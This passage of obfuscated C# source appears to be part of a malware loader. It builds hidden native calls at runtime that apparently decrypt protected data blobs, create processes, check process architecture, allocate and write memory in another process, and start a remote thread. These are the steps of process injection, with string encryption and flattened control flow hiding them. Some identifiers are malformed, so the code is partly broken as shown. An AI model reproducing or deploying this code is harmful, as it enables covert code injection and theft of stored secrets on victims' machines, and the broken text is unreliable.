		public bool session3394 {
			[CompilerGenerated]
			get {
				return stack3152;
			}
			[CompilerGenerated]
			set {
				stack3152 = value;
			}
		}
	}
}
namespace graph72
{
	public class args3819
	{
		[CompilerGenerated]
		private string options996 = string.Empty;

		[CompilerGenerated]
		private string avg7486 = string.Empty;

		[CompilerGenerated]
		private string list601 = string.Empty;

		[CompilerGenerated]
		private string size1895 = string.Empty;

		[CompilerGenerated]
		private byte[] error7273 = new byte[0];

		[CompilerGenerated]
		private byte[] rate956 = new byte[0];

		[CompilerGenerated]
		private List<next84> message44 = new List<next84> ();

		[cache00 (0)]
		public string format205 {
			[CompilerGenerated]
			get {
				return options996;
			}
			[CompilerGenerated]
			set {
				options996 = value;
			}
		}

		[cache00 (1)]
		public string context5068 {
			[CompilerGenerated]
			get {
				return avg7486;
			}
			[CompilerGenerated]
			set {
				avg7486 = value;
			}
		}

		[cache00 (2)]
		public string price61 {
			[CompilerGenerated]
			get {
				return list601;
			}
			[CompilerGenerated]
			set {
				list601 = value;
			}
		}

		[cache00 (3)]
		public string dir2850 {
			[CompilerGenerated]
			get {
				return size1895;
			}
			[CompilerGenerated]
			set {
				size1895 = value;
			}
		}

		[cache00 (4)]
		public byte[] dir620 {
			[CompilerGenerated]
			get {
				return error7273;
			}
			[CompilerGenerated]
			set {
				error7273 = value;
			}
		}

		[cache00 (5)]
		public byte[] array9821 {
			[CompilerGenerated]
			get {
				return rate956;
			}
			[CompilerGenerated]
			set {
				rate956 = value;
			}
		}

		[cache00 (6)]
		public List<next84> file372 {
			[CompilerGenerated]
			get {
				return message44;
			}
			[CompilerGenerated]
			set {
				message44 = value;
			}
		}
	}
}
namespace current5545
{
	public class next84
	{
		[CompilerGenerated]
		private string dir059 = string.Empty;

		[CompilerGenerated]
		private string queue0470 = string.Empty;

		[CompilerGenerated]
		private input6339 queue185;

		[CompilerGenerated]
		private input6339 column879;

		[CompilerGenerated]
		private input6339 format3068;

		[CompilerGenerated]
		private input6339 status55;

		[CompilerGenerated]
		private input6339 speed922;

		[CompilerGenerated]
		private string queue149 = string.Empty;

		[cache00 (0)]
		public string number9326 {
			[CompilerGenerated]
			get {
				return dir059;
			}
			[CompilerGenerated]
			set {
				dir059 = value;
			}
		}

		[cache00 (1)]
		public string limit63 {
			[CompilerGenerated]
			get {
				return queue0470;
			}
			[CompilerGenerated]
			set {
				queue0470 = value;
			}
		}

		[cache00 (2)]
		public input6339 line50 {
			[CompilerGenerated]
			get {
				return queue185;
			}
			[CompilerGenerated]
			set {
				queue185 = value;
			}
		}

		[cache00 (3)]
		public input6339 options536 {
			[CompilerGenerated]
			get {
				return column879;
			}
			[CompilerGenerated]
			set {
				column879 = value;
			}
		}

		[cache00 (4)]
		public input6339 offset6235 {
			[CompilerGenerated]
			get {
				return format3068;
			}
			[CompilerGenerated]
			set {
				format3068 = value;
			}
		}

		[cache00 (5)]
		public input6339 stream2062 {
			[CompilerGenerated]
			get {
				return status55;
			}
			[CompilerGenerated]
			set {
				status55 = value;
			}
		}

		[cache00 (6)]
		public input6339 row1817 {
			[CompilerGenerated]
			get {
				return speed922;
			}
			[CompilerGenerated]
			set {
				speed922 = value;
			}
		}

		[cache00 (7)]
		public string start54 {
			[CompilerGenerated]
			get {
				return queue149;
			}
			[CompilerGenerated]
			set {
				queue149 = value;
			}
		}
	}
}
namespace list537
{
	public class stack598
	{
		[CompilerGenerated]
		private byte[] current488 = new byte[0];

		[CompilerGenerated]
		private List<input6339> right532 = new List<input6339> ();

		[cache00 (0)]
		public byte[] cache7392 {
			[CompilerGenerated]
			get {
				return current488;
			}
			[CompilerGenerated]
			set {
				current488 = value;
			}
		}

		[cache00 (1)]
		public List<input6339> count32 {
			[CompilerGenerated]
			get {
				return right532;
			}
			[CompilerGenerated]
			set {
				right532 = value;
			}
		}
	}
}
namespace format694
{
	public class temp615
	{
		[CompilerGenerated]
		private string data53 = string.Empty;

		[CompilerGenerated]
		private string list30 = string.Empty;

		[CompilerGenerated]
		private List<mode580> list98 = new List<mode580> ();

		[cache00 (0)]
		public string parent89 {
			[CompilerGenerated]
			get {
				return data53;
			}
			[CompilerGenerated]
			set {
				data53 = value;
			}
		}

		[cache00 (1)]
		public string flag83 {
			[CompilerGenerated]
			get {
				return list30;
			}
			[CompilerGenerated]
			set {
				list30 = value;
			}
		}

		[cache00 (2)]
		public List<mode580> input94 {
			[CompilerGenerated]
			get {
				return list98;
			}
			[CompilerGenerated]
			set {
				list98 = value;
			}
		}
	}
}
namespace offset794
{
	public class mode580
	{
		[CompilerGenerated]
		private string count7868 = string.Empty;

		[CompilerGenerated]
		private string queue2580 = string.Empty;

		[CompilerGenerated]
		private input6339 amount18;

		[CompilerGenerated]
		private input6339 format607;

		[CompilerGenerated]
		private input6339 list42;

		[CompilerGenerated]
		private input6339 index790;

		[CompilerGenerated]
		private input6339 count87;

		[cache00 (0)]
		public string rate84 {
			[CompilerGenerated]
			get {
				return count7868;
			}
			[CompilerGenerated]
			set {
				count7868 = value;
			}
		}

		[cache00 (1)]
		public string name985 {
			[CompilerGenerated]
			get {
				return queue2580;
			}
			[CompilerGenerated]
			set {
				queue2580 = value;
			}
		}

		[cache00 (2)]
		public input6339 list5587 {
			[CompilerGenerated]
			get {
				return amount18;
			}
			[CompilerGenerated]
			set {
				amount18 = value;
			}
		}

		[cache00 (3)]
		public input6339 previous7756 {
			[CompilerGenerated]
			get {
				return format607;
			}
			[CompilerGenerated]
			set {
				format607 = value;
			}
		}

		[cache00 (4)]
		public input6339 time61 {
			[CompilerGenerated]
			get {
				return list42;
			}
			[CompilerGenerated]
			set {
				list42 = value;
			}
		}

		[cache00 (5)]
		public input6339 text80 {
			[CompilerGenerated]
			get {
				return index790;
			}
			[CompilerGenerated]
			set {
				index790 = value;
			}
		}

		[cache00 (6)]
		public input6339 end2978 {
			[CompilerGenerated]
			get {
				return count87;
			}
			[CompilerGenerated]
			set {
				count87 = value;
			}
		}
	}
}
namespace error132
{
	public class item825
	{
		[CompilerGenerated]
		private List<string> index895 = new List<string> ();

		[CompilerGenerated]
		private string child44 = string.Empty;

		[CompilerGenerated]
		private List<string> previous6961 = new List<string> ();

		[cache00 (0)]
		public List<string> stream215 {
			[CompilerGenerated]
			get {
				return index895;
			}
			[CompilerGenerated]
			set {
				index895 = value;
			}
		}

		[cache00 (1)]
		public string name1443 {
			[CompilerGenerated]
			get {
				return child44;
			}
			[CompilerGenerated]
			set {
				child44 = value;
			}
		}

		[cache00 (3)]
		public List<string> error70 {
			[CompilerGenerated]
			get {
				return previous6961;
			}
			[CompilerGenerated]
			set {
				previous6961 = value;
			}
		}
	}
}
namespace buffer7215
{
	public class number121
	{
		[CompilerGenerated]
		private List<row9445> price212 = new List<row9445> ();

		[CompilerGenerated]
		private List<input6339> previous873 = new List<input6339> ();

		[cache00 (0)]
		public List<row9445> id322 {
			[CompilerGenerated]
			get {
				return price212;
			}
			[CompilerGenerated]
			set {
				price212 = value;
			}
		}

		[cache00 (1)]
		public List<input6339> line32 {
			[CompilerGenerated]
			get {
				return previous873;
			}
			[CompilerGenerated]
			set {
				previous873 = value;
			}
		}
	}
}
namespace price0921
{
	public class column714
	{
		[CompilerGenerated]
		private List<byte[]> limit9103 = new List<byte[]> ();

		[CompilerGenerated]
		private List<byte[]> end519 = new List<byte[]> ();

		[cache00 (0)]
		public List<byte[]> score3521 {
			[CompilerGenerated]
			get {
				return limit9103;
			}
			[CompilerGenerated]
			set {
				limit9103 = value;
			}
		}

		[cache00 (1)]
		public List<byte[]> column21 {
			[CompilerGenerated]
			get {
				return end519;
			}
			[CompilerGenerated]
			set {
				end519 = value;
			}
		}
	}
}
namespace line98
{
	public class time90
	{
		private struct tree545 (int level0173, ParameterAttributes map7793)
		{
			public int mode2668 = level0173;

			public ParameterAttributes price95 = map7793;
		}

		private static object[] node847 (string left6977, string limit49, Type previous403, Type[] balance231, object[] previous618, CharSet name6006 = CharSet.Auto, tree545[] next892 = null)
		{
			string text873 = rate33.format0123 ();
			ModuleBuilder moduleBuilder = default(ModuleBuilder);
			MethodBuilder methodBuilder = default(MethodBuilder);
			tree545 tree546 = default(tree545);
			int num3 = default(int);
			tree545[] array8362 = default(tree545[]);
			object obj = default(object);
			while (true) {
				int num = -1014328919;
				while (true) {
					uint num2 = (uint)(num - -1665735960);
					switch (num2 % 16) {
					case 3u:
						break;
					default:
						num = -1014328919;
						continue;
					case 2u:
						moduleBuilder = null;
						num = (int)num2 + -1927061635;
						continue;
					case 11u:
						methodBuilder.DefineParameter (tree546.mode2668, tree546.price95, null);
						num = (int)num2 + -1170824900;
						continue;
					case 13u:
						moduleBuilder.CreateGlobalFunctions ();
						num = -1151146852;
						continue;
					case 15u:
						num3 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2e9b0ac1b0d509398a7");
						num = (int)(num2 - 1944576914);
						continue;
					case 0u:
						num = (int)num2 ^ -71485827;
						continue;
					case 14u:
						num = ((next892 == null) ? ((int)num2 - -1934163143) : ((int)num2 - -2141790420));
						continue;
					case 1u:
						moduleBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly (new AssemblyName (text873), (AssemblyBuilderAccess)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8cfb51a57791aab634e")).DefineDynamicModule (text873);
						num = (int)(num2 - 1865526976);
						continue;
					case 7u:
						methodBuilder = null;
						num = (int)num2 ^ -81695159;
						continue;
					case 10u:
						array8362 = next892;
						num = (int)(num2 - 55803990);
						continue;
					case 4u:
						obj = moduleBuilder.GetMethod (text873).Invoke (null, previous618);
						num = (int)num2 + -639725274;
						continue;
					case 8u:
						tree546 = array8362 [num3];
						num = -1196571469;
						continue;
					case 12u:
						num3 = 0;
						num = (int)((0 - num2) ^ 0x576AF9CC);
						continue;
					case 5u:
						num = ((num3 < array8362.Length) ? (~643538975) : (-1562341883));
						continue;
					case 9u:
						methodBuilder = moduleBuilder.DefinePInvokeMethod (text873, left6977, limit49, (MethodAttributes)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8e847ed2059525165aa"), (CallingConventions)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("45c19efea40d65a6c9e"), previous403, balance231, (CallingConvention)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ac13b9ea73927963dbb"), name6006);
						methodBuilder.SetImplementationFlags ((MethodImplAttributes)((int)methodBuilder.GetMethodImplementationFlags () | flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("7352d83c607820da09d")));
						num = (int)((0 - num2) ^ 0x295A96C1);
						continue;
					case 6u: {
						object[] array8361 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ad57fd506098b3a46c1")];
						array8361 [0] = obj;
						return array8361;
					}
					}
					break;
				}
			}
		}

		private static amount452 limit47<amount452> (Func<amount452> array263, amount452 options499)
		{
			int num = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8d50fa6fcc967d62660");
			amount452 result = default(amount452);
			while (true) {
				IL_0053:
				if (num <= flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bf68b236d1928fbe678")) {
					try {
						result = array263 ();
						return result;
					} catch {
					}
					num += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d945f44c6ec309a4c3b");
					goto IL_0027;
				}
				int num2 = -1633579273;
				goto IL_002c;
				IL_002c:
				while (true) {
					uint num3;
					switch ((num3 = (uint)(num2 + -1110597909)) % 4) {
					case 0u:
						break;
					default:
						num2 = -1492294936;
						continue;
					case 3u:
						goto IL_0053;
					case 2u:
						return options499;
					case 1u:
						return result;
					}
					break;
				}
				goto IL_0027;
				IL_0027:
				num2 = -1492294936;
				goto IL_002c;
			}
		}

		private static void balance784 (Action path63)
		{
			limit47 (delegate {
				path63 ();
				return 0;
			}, 0);
		}

		public byte[] cell7644 (byte[] format507, byte[] min60 = null)
		{
			return limit47 (delegate {
				array8360.product66 product = new array8360.product66 (format507);
				array8360.product66 product2 = new array8360.product66 (min60);
				array8360.buffer6984 buffer2186 = new array8360.buffer6984 ();
				object[] array8361 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ace8724de497eedf9fd")];
				array8361 [0] = product;
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5523c24e3c06cdad69c")] = string.Empty;
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8d64cebd9d9c1805c9a")] = product2;
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4f6be91e5628858559d")] = IntPtr.Zero;
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5e873d81320eb1a069d")] = buffer2186;
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2e9295e8eff3fe0f078")] = flag6144.fd084e43cbed44518c63432f41e19486 ("ae6fb509f9a68");
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3d91e38be998ba702b9")] = default(array8360.product66);
				object[] array8362 = array8361;
				string left8243 = flag6144.0e291526dfde44109a60e580c474e7dd ("9e4f4b0ee4bb1b0829b2d6b3fd00b4cd0");
				string limit = flag6144.0e291526dfde44109a60e580c474e7dd ("9d2fcf3078a8647f659a461991a056634921d63a8cb59c1");
				Type typeFromHandle = typeof(bool);
				Type[] array8363 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2e9e6257f86d3d599b7")];
				array8363 [0] = typeof(array8360.product66).MakeByRefType ();
				array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8d8a201317904b5fe50")] = typeof(string).MakeByRefType ();
				array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d9e8a92808c9238476c")] = typeof(array8360.product66).MakeByRefType ();
				array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("526dadcd434470e9a9d")] = typeof(IntPtr);
				array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9ef0cd4cade83210d6")] = typeof(array8360.buffer6984).MakeByRefType ();
				array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5022c719852d048aa9c")] = typeof(byte);
				array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("57de84676d57acf709e")] = typeof(array8360.product66).MakeByRefType ();
				node847 (left8243, limit, typeFromHandle, array8363, array8362, (CharSet)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e93be85503d17cd5233"));
				return ((array8360.product66)array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2d925c185608e25af0f")]).status6471 ();
			}, new byte[0]);
		}

		public bool graph2123 (string min208, string avg8423, IntPtr level0016, IntPtr max138, bool left9274, uint count8329, IntPtr date646, string buffer387, ref array8360.source274 mode360, out array8360.message891 key4655)
		{
			string lpCurrentDirectory = default(string);
			array8360.message891 pi = default(array8360.message891);
			bool ok = default(bool);
			IntPtr lpThreadAttributes = default(IntPtr);
			bool bInheritHandles = default(bool);
			uint dwCreationFlags = default(uint);
			IntPtr lpEnvironment = default(IntPtr);
			array8360.source274 si = default(array8360.source274);
			while (true) {
				int num = 1083913563;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num + 651496336)) % 9) {
					case 4u:
						break;
					default:
						num = 1083913563;
						continue;
					case 8u:
						lpCurrentDirectory = buffer387;
						num = (int)(num2 ^ 0xC649C83);
						continue;
					case 3u:
						pi = default(array8360.message891);
						ok = false;
						balance784 (delegate {
							object[] array8361 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2c9b7de6b7d57aecf00")];
							array8361 [0] = min208;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e9bd0cfad9f6ec40040")] = avg8423;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1e9e44540e4e241b824")] = level0016;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1d96438b99bd94d2bdb")] = lpThreadAttributes;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ae8d57ff24932d1cdb6")] = bInheritHandles;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2c91a38bd99a55fb548")] = dwCreationFlags;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bc69c3bea39555485be")] = lpEnvironment;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9a33053cbee9735747")] = lpCurrentDirectory;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("462c5ec85cedef4779f")] = si;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8efe149f059a99a5439")] = pi;
							object[] array8362 = array8361;
							object[] array8363 = default(object[]);
							while (true) {
								int num3 = -1321737549;
								while (true) {
									uint num4;
									switch ((num4 = (uint)(~num3 ^ 0x1623BB23)) % 4) {
									case 2u:
										break;
									default:
										num3 = -1321737549;
										continue;
									case 3u: {
										string left9275 = flag6144.0e291526dfde44109a60e580c474e7dd ("3e9644d18144afac3e48a574c075ca5159e");
										string limit = flag6144.0e291526dfde44109a60e580c474e7dd ("1c989c6e49490410249f4cd18ca3e24b3eed0");
										Type typeFromHandle = typeof(bool);
										Type[] array8364 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("75530604db0208aed9d")];
										array8364 [0] = typeof(string);
										array8364 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("46b6c66bbce6ed4d49f")] = typeof(string);
										array8364 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("79fddff36b029aa639d")] = typeof(IntPtr);
										array8364 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0c9acea7149a9ae1d67")] = typeof(IntPtr);
										array8364 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3c94e98903b3d36d17a")] = typeof(bool);
										array8364 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("67ced4f7b76716c0b9f")] = typeof(uint);
										array8364 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f93938a768df55fb1b3")] = typeof(IntPtr);
										array8364 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ae25bf9db0963f0aef7")] = typeof(string);
										array8364 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("7e61aa2eb73df49769c")] = typeof(array8360.source274).MakeByRefType ();
										array8364 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f92b188752fbf5504a2")] = typeof(array8360.message891).MakeByRefType ();
										int name = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("6829d805cfb1ac1f79e");
										tree545[] array8365 = new tree545[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9cc8d01b9e40ea1a63")];
										array8365 [0] = new tree545 (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8d3ad0427c9f3c09230"), (ParameterAttributes)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("74a17f746094913f39c"));
										array8365 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0c9241f8fbe7c4fc606")] = new tree545 (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e927e44ed7cb06af4f6"), (ParameterAttributes)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9c9d37e4da9c9882d04"));
										array8363 = node847 (left9275, limit, typeFromHandle, array8364, array8362, (CharSet)name, array8365);
										num3 = (int)(0 - num4 + 1166840779);
										continue;
									}
									case 0u:
										ok = (bool)array8363 [0];
										si = (array8360.source274)array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2c985c11f628f3e4777")];
										pi = (array8360.message891)array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9b487709be9f75ef37")];
										num3 = (int)num4 - -2080307617;
										continue;
									case 1u:
										return;
									}
									break;
								}
							}
						});
						mode360 = si;
						num = (int)(num2 ^ 0x1A57D6D0);
						continue;
					case 0u:
						dwCreationFlags = count8329;
						num = (int)(0 - num2) ^ -36333774;
						continue;
					case 2u:
						si = mode360;
						num = (int)(0 - num2 + 1710136132);
						continue;
					case 1u:
						lpThreadAttributes = max138;
						num = (int)(0 - num2 + 1146693464);
						continue;
					case 5u:
						bInheritHandles = left9274;
						num = (int)num2 ^ -509679370;
						continue;
					case 6u:
						lpEnvironment = date646;
						num = (int)(0 - num2 + 1082402494);
						continue;
					case 7u:
						key4655 = pi;
						return ok;
					}
					break;
				}
			}
		}

		public bool? height570 (IntPtr rate0551, out bool output76)
		{
			bool isWow64 = false;
			bool? result = limit47 (delegate {
				bool? result2 = default(bool?);
				try {
					object[] array8361 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1f9e5be411f5c0e41a0")];
					array8361 [0] = rate0551;
					array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("735485d08770c6db69e")] = false;
					object[] array8362 = array8361;
					string left8243 = flag6144.0e291526dfde44109a60e580c474e7dd ("8ec8bd14f291df5f979db12b467cf7d9830");
					string limit = flag6144.0e291526dfde44109a60e580c474e7dd ("f9d44ee59a2bd363553cc6ff994df20c4849452");
					Type typeFromHandle = typeof(bool);
					Type[] array8363 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3d94b99ef384d793f37")];
					array8363 [0] = typeof(IntPtr);
					array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3f910d0bb7149f191ca")] = typeof(bool).MakeByRefType ();
					int name = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("72d9ad9315a3260df9e");
					tree545[] array8364 = new tree545[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d9952480d7c68c2187a")];
					array8364 [0] = new tree545 (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0e9fefc5a5d5492481c"), (ParameterAttributes)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3c98c882829f961e3b5"));
					object[] array8365 = node847 (left8243, limit, typeFromHandle, array8363, array8362, (CharSet)name, array8364);
					isWow64 = (bool)array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3c97191da30e79bfccd")];
					result2 = (bool)array8365 [0];
				} catch {
					bool? flag6145 = default(bool?);
					while (true) {
						IL_00eb:
						int num = -1110492190;
						while (true) {
							uint num2;
							switch ((num2 = (uint)(num ^ -1634480707)) % 4) {
							case 0u:
								break;
							default:
								num = -1110492190;
								continue;
							case 3u:
								flag6145 = null;
								num = (int)(0 - num2) + -1500164986;
								continue;
							case 2u:
								result2 = flag6145;
								num = (int)num2 ^ -880892622;
								continue;
							case 1u:
								goto end_IL_00f1;
							}
							goto IL_00eb;
							continue;
							end_IL_00f1:
							break;
						}
						break;
					}
				}
				return result2;
			}, false);
			output76 = isWow64;
			return result;
		}

		public IntPtr cache879 (IntPtr page587, IntPtr index6259, IntPtr next10, uint target16, uint size4782)
		{
			return limit47 (delegate {
				string left8243 = flag6144.0e291526dfde44109a60e580c474e7dd ("c9d910346971b97238db1c439e2af765eb6");
				string limit = flag6144.0e291526dfde44109a60e580c474e7dd ("0f9bf5ca7375ad5cccccb58212d451ff92c12e9");
				Type typeFromHandle = typeof(IntPtr);
				Type[] array8361 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9a1d0d8add11bbd48d")];
				array8361 [0] = typeof(IntPtr);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c907b6b73bcf65c6a02")] = typeof(IntPtr);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5977782fd8c71963b9d")] = typeof(IntPtr);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3e9e9fa345901211bb6")] = typeof(uint);
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3e9a06d7ece4f3ea077")] = typeof(uint);
				object[] array8362 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("7d5af290803a419de9e")];
				array8362 [0] = page587;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2f923f988581a338115")] = index6259;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9eeaf42ebc75dfb30d")] = next10;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9de0d802ed964c4d45")] = target16;
				array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9c52689b6d5e84dfa7")] = size4782;
				return (IntPtr)node847 (left8243, limit, typeFromHandle, array8361, array8362, (CharSet)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("624a8356408c432299c")) [0];
			}, IntPtr.Zero);
		}

		public bool stream774 (IntPtr cell899, IntPtr count46, byte[] next603, IntPtr limit42, out IntPtr child5335)
		{
			IntPtr nSize = default(IntPtr);
			IntPtr written = default(IntPtr);
			IntPtr hProcess = default(IntPtr);
			IntPtr lpBaseAddress = default(IntPtr);
			byte[] lpBuffer = default(byte[]);
			while (true) {
				int num = --1897929678;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num ^ 0x314546BF)) % 6) {
					case 0u:
						break;
					default:
						num = 1897929678;
						continue;
					case 1u:
						nSize = limit42;
						num = (int)(num2 + 527282177);
						continue;
					case 3u:
						written = IntPtr.Zero;
						num = (int)(num2 ^ 0x426AB9F8);
						continue;
					case 5u:
						hProcess = cell899;
						num = (int)(num2 + 199216392);
						continue;
					case 2u:
						lpBaseAddress = count46;
						lpBuffer = next603;
						num = (int)(~num2) + -1876931839;
						continue;
					case 4u: {
						bool result = limit47 (delegate {
							object[] array8361 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0d9de6879c9719a3a5c")];
							array8361 [0] = hProcess;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e970c10153dd973683b")] = lpBaseAddress;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ae2882dba691657be3e")] = lpBuffer;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9ef3c44fcc8f5573af")] = nSize;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ac1dc7c96a9e80be83e")] = written;
							object[] array8362 = array8361;
							string left8243 = flag6144.0e291526dfde44109a60e580c474e7dd ("1e9488434ddd77abbb6a2689abc4227fa67");
							string limit43 = flag6144.0e291526dfde44109a60e580c474e7dd ("d9d1f339b046623ee2fe2815ed78761136f8f77037c1ce1");
							Type typeFromHandle = typeof(bool);
							Type[] array8363 = new Type[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c92d5cb0f4dd67cc4f6")];
							array8363 [0] = typeof(IntPtr);
							array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e9e455be48e3e940ff1")] = typeof(IntPtr);
							array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4a2f9927c67c17d8b9e")] = typeof(byte[]);
							array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9fe2d812bdb9630149")] = typeof(IntPtr);
							array8363 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9d4298a248995761d04")] = typeof(IntPtr).MakeByRefType ();
							int name = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2f98cf75254631f9951");
							tree545[] array8364 = new tree545[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9e2d8795759f544d4a3")];
							array8364 [0] = new tree545 (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3d9a43903985fa661bc"), (ParameterAttributes)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2c9c78463258abdcc19"));
							object[] array8365 = node847 (left8243, limit43, typeFromHandle, array8363, array8362, (CharSet)name, array8364);
							written = (IntPtr)array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e98e6d6da4db76d93cd")];
							return (bool)array8365 [0];
						}, options499: false);
						child5335 = written;
						return result;
					}
					}
					break;
				}
			}
		}

		public IntPtr page5988 (IntPtr color442, IntPtr map9087, IntPtr next755, IntPtr rate1080, IntPtr key166, uint offset432, out IntPtr cache8804)
		{
			IntPtr lpThreadAttributes = default(IntPtr);
			IntPtr lpStartAddress = default(IntPtr);
			IntPtr lpParameter = default(IntPtr);
			IntPtr dwStackSize = default(IntPtr);
			uint dwCreationFlags;
			IntPtr threadId;
			while (true) {
				int num = -560408179;
				while (true) {
					uint num2 = (uint)(num - 1660339136);
					switch (num2 % 6) {
					case 0u:
						break;
					default:
						num = -560408179;
						continue;
					case 1u:
						lpThreadAttributes = map9087;
						num = (int)num2 ^ -493413643;
						continue;
					case 5u:
						lpStartAddress = rate1080;
						num = (int)(0 - num2) + -548200206;
						continue;
					case 3u:
						lpParameter = key166;
						num = (int)(~num2) ^ -1528488524;
						continue;
					case 2u:
						dwStackSize = next755;
						num = (int)num2 ^ -1992891701;
						continue;
					case 4u: {
						dwCreationFlags = offset432;
						threadId = IntPtr.Zero;
						IntPtr result = limit47 (delegate {
							object[] array8361 = new object[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d91c8fe7a7fee7440fd")];
							array8361 [0] = color442;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9d56474b7d1db7ae10")] = lpThreadAttributes;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c945042d96d913bb986")] = dwStackSize;
							array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("af38e280679f3201309")] = lpStartAddress;
